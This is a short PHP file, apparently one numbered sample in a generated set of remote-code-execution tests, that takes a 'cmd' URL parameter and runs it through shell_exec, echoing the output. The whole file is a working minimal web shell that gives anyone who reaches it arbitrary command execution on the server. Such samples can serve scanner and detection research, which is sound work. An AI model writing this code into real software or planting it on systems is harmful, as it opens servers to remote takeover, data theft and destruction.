<?php
// RCE test variation #1440
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>